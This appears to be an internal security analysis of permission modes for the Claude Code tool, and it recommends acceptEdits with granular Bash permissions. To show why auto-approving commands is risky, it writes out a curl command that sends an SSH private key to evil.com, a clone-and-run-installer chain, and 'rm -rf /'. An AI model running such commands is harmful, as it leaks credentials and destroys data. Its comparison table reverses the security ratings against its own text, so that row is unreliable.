# Claude Code defaultMode Security Analysis

## Executive Summary

This document analyzes the three `defaultMode` options for Claude Code permissions:
- **acceptEdits**: Auto-approves file edits, prompts for Bash commands
- **prompt**: Prompts for all operations (edits and Bash)
- **acceptBash**: Auto-approves Bash commands, prompts for edits

**Recommendation**: **Keep `acceptEdits`** with granular Bash permissions (current state after migration).

---

## Option 1: acceptEdits (Current Configuration)

### Description
- **Auto-approves**: File operations (Read, Write, Edit, Glob, Grep)
- **Prompts for**: Bash command execution
- **Philosophy**: Trust file operations, gate system commands

### Security Posture

**Strengths:**
- ✅ Prevents unauthorized system command execution
- ✅ User explicitly reviews each Bash command before execution
- ✅ No impact to file I/O workflow - fast iteration
- ✅ Works well with granular Bash permissions (229 specific commands)
- ✅ Sandbox + autoAllowBashIfSandboxed provides additional safety layer

**Weaknesses:**
- ⚠️ File operations can still modify code without prompts
- ⚠️ Could write malicious code to files (though can't execute without approval)
- ⚠️ Depends on user vigilance to review Bash commands

**Risk Assessment:**
- **File System Risk**: MEDIUM (can modify any files in allowed paths)
- **Command Execution Risk**: LOW (all commands require approval)
- **Overall Risk**: MEDIUM-LOW

### Use Cases
- **Best for**: Development workflows with trusted AI models
- **Workflows**: Rapid prototyping, refactoring, documentation updates
- **Team size**: Individual developers or small teams with code review

---

## Option 2: prompt (Maximum Security)

### Description
- **Auto-approves**: Nothing
- **Prompts for**: All file operations AND Bash commands
- **Philosophy**: Zero trust - explicit approval for everything

### Security Posture

**Strengths:**
- ✅ Maximum control - user sees every operation
- ✅ Prevents unauthorized file modifications
- ✅ Prevents unauthorized command execution
- ✅ Audit trail of all approved actions
- ✅ Ideal for sensitive codebases or compliance requirements

**Weaknesses:**
- ❌ Severely impacts development velocity
- ❌ Prompt fatigue - users may approve without reading
- ❌ Not practical for high-frequency file operations (Read, Grep)
- ❌ Claude Code's value proposition (autonomous coding) is diminished

**Risk Assessment:**
- **File System Risk**: VERY LOW (all operations require approval)
- **Command Execution Risk**: VERY LOW (all commands require approval)
- **Overall Risk**: VERY LOW

### Use Cases
- **Best for**: Highly regulated environments, untrusted models, production systems
- **Workflows**: Security audits, one-off modifications, critical infrastructure
- **Team size**: Enterprise with compliance requirements (SOC2, HIPAA, etc.)

---

## Option 3: acceptBash (Least Secure)

### Description
- **Auto-approves**: Bash command execution
- **Prompts for**: File operations (Read, Write, Edit)
- **Philosophy**: Trust system commands, gate file changes

### Security Posture

**Strengths:**
- ✅ Fast command execution for scripting workflows
- ✅ User reviews file changes before they happen
- ✅ Useful for non-coding tasks (system administration, DevOps)

**Weaknesses:**
- ❌ HIGH RISK: Auto-executes system commands without approval
- ❌ With Bash(*), this is CRITICAL vulnerability (arbitrary command execution)
- ❌ Even with granular permissions, dangerous command combinations possible
- ❌ No human oversight before potential system damage
- ❌ Could exfiltrate data, modify system files, install malware

**Risk Assessment:**
- **File System Risk**: LOW (file changes require approval)
- **Command Execution Risk**: HIGH to CRITICAL (depends on allowed commands)
- **Overall Risk**: HIGH

### Use Cases
- **Best for**: NONE - Not recommended even with granular permissions
- **Workflows**: N/A
- **Team size**: N/A

**⚠️ WARNING**: This mode should NOT be used, even with granular Bash permissions. Command chaining (&&, ||, |), subshells, and flag combinations can bypass intended restrictions.

---

## Comparative Matrix

| Criteria | acceptEdits | prompt | acceptBash |
|----------|-------------|--------|------------|
| **Security** | Medium-Low | Very Low | High |
| **Usability** | High | Low | Medium |
| **Velocity** | High | Very Low | Medium |
| **Audit Trail** | Partial | Complete | Partial |
| **Enterprise Ready** | Yes* | Yes | No |
| **Sandbox Compatible** | Yes | Yes | Yes |
| **Recommended** | ✅ Yes | ⚠️ Special cases | ❌ No |

*With granular Bash permissions

---

## Interaction with Other Security Features

### Sandbox Mode (`"sandbox": {"enabled": true}`)
- Isolates Claude Code in a restricted environment
- Limits file system access to specified paths
- **Works with all defaultMode options**
- Current config: ✅ Enabled

### autoAllowBashIfSandboxed
- When `true`: Auto-approves Bash commands IF sandbox is enabled
- When `false`: Always prompts for Bash (regardless of sandbox state)
- Current config: `true` (but overridden by `defaultMode: acceptEdits`)
- **Important**: This setting is subordinate to `defaultMode`

### Granular Bash Permissions (Post-Migration)
- Replaces `Bash(*)` with 229 specific commands
- Prevents execution of unlisted commands
- **Significantly reduces risk** for both `acceptEdits` and `acceptBash` modes
- Example: Can't execute `nmap` to scan internal networks if not in allowed list

### Permission Interaction Order
1. **defaultMode** determines if prompting happens
2. **Sandbox** restricts WHERE operations can occur
3. **Granular permissions** restrict WHICH operations are allowed
4. **autoAllowBashIfSandboxed** is fallback behavior (rarely applies)

---

## Recommendation: Keep acceptEdits

### Rationale

**Current State After Migration:**
- Sandbox: ✅ Enabled (limits file system access)
- Bash Permissions: ✅ Granular (229 specific commands, no wildcards)
- defaultMode: ✅ acceptEdits (prompts for Bash)

This configuration achieves **defense in depth**:

1. **Layer 1 - Sandbox**: Restricts file system access to project directories
2. **Layer 2 - Granular Permissions**: Only 229 vetted commands can execute
3. **Layer 3 - defaultMode: acceptEdits**: User reviews each command before execution
4. **Layer 4 - File Operations**: Allowed paths restrict where files can be modified

### Why Not `prompt`?
- Claude Code's value is autonomous file editing (refactoring, implementation)
- Prompting for every Read/Grep operation destroys workflow
- Prompt fatigue leads to blind approvals (security theater)
- Sandbox + file path restrictions already limit file system damage

### Why Not `acceptBash`?
- Even with 229 granular commands, command chaining is dangerous
- Example: `git clone <malicious-repo> && bash install.sh`
- Example: `curl http://evil.com/data -d "$(cat ~/.ssh/id_rsa)"`
- No human oversight = unacceptable risk

### Security Improvements Achieved
- **Before**: `Bash(*)` + `acceptEdits` = Medium-High Risk
- **After**: 229 commands + `acceptEdits` = Medium-Low Risk
- **Further hardening**: Could add command argument validation in future

---

## Alternative Configurations

### High-Security Workflow (Enterprise/Compliance)
```json
{
  "sandbox": {
    "enabled": true,
    "autoAllowBashIfSandboxed": false
  },
  "permissions": {
    "defaultMode": "prompt"
  }
}
```
**Trade-off**: Maximum security, minimal velocity

### Trusted Environment Workflow (Personal Projects)
```json
{
  "sandbox": {
    "enabled": true,
    "autoAllowBashIfSandboxed": true
  },
  "permissions": {
    "defaultMode": "acceptEdits"
  }
}
```
**Trade-off**: Balanced security and velocity (RECOMMENDED)

### ⚠️ NOT RECOMMENDED: Permissive Mode
```json
{
  "sandbox": {
    "enabled": false
  },
  "permissions": {
    "defaultMode": "acceptBash"
  }
}
```
**Risk**: CRITICAL - Arbitrary command execution without oversight

---

## Future Enhancements

### Short-term (Next Quarter)
1. **Command Argument Validation**: Restrict dangerous flag combinations
   - Example: Allow `rm` but block `rm -rf /`
   - Example: Allow `curl` but block data exfiltration patterns

2. **Execution Telemetry**: Log all approved Bash commands
   - Audit trail for security reviews
   - Anomaly detection for unusual patterns

3. **Graduated Permissions**: Time-based or reputation-based trust
   - First 10 commands require approval
   - After trust established, move to `acceptBash` for specific commands

### Long-term (Future Roadmap)
1. **ML-based Risk Scoring**: Auto-approve low-risk commands
   - `git status` = auto-approve
   - `curl <unknown-domain>` = always prompt

2. **Context-Aware Permissions**: Different modes for different tasks
   - "documentation mode" = `acceptEdits` + read-only Bash
   - "deployment mode" = `prompt` for everything

3. **Allowlist Learning**: Suggest new commands based on denied attempts
   - Track which commands users approve
   - Auto-update `.auto-claude-security.json`

---

## Testing Recommendations

### Verify Current Configuration
```bash
# Confirm defaultMode setting
python -c "import json; data = json.load(open('.claude_settings.json')); print(f\"defaultMode: {data['permissions']['defaultMode']}\")"

# Confirm sandbox enabled
python -c "import json; data = json.load(open('.claude_settings.json')); print(f\"sandbox: {data['sandbox']['enabled']}\")"

# Confirm granular Bash permissions (post-migration)
python -c "import json; data = json.load(open('.claude_settings.json')); perms = [p for p in data['permissions']['allow'] if p.startswith('Bash(') and p != 'Bash(*)']; print(f\"Granular Bash permissions: {len(perms)}\")"
```

### Test Bash Command Prompting
1. Trigger a Bash command via Claude Code
2. Verify prompt appears before execution
3. Test both approval and denial paths

### Test File Operation Auto-Approval
1. Request Claude Code to edit a file
2. Verify no prompt appears (auto-approved)
3. Confirm file changes occur immediately

---

## Conclusion

**Final Recommendation: Keep `defaultMode: "acceptEdits"`**

With the completed migration to granular Bash permissions, the current configuration provides:
- ✅ Strong security posture (Medium-Low risk, down from Medium-High)
- ✅ High development velocity (file operations auto-approved)
- ✅ User oversight on system commands (Bash execution requires approval)
- ✅ Defense in depth (sandbox + granular permissions + prompting)

**No change required** - the existing `acceptEdits` mode is the optimal balance between security and usability for this hardened configuration.

---

**Document Version**: 1.0
**Last Updated**: 2026-02-16
**Related Specs**: 064-restrict-overly-permissive-claude-code-bash-permis
**Status**: Ready for Review
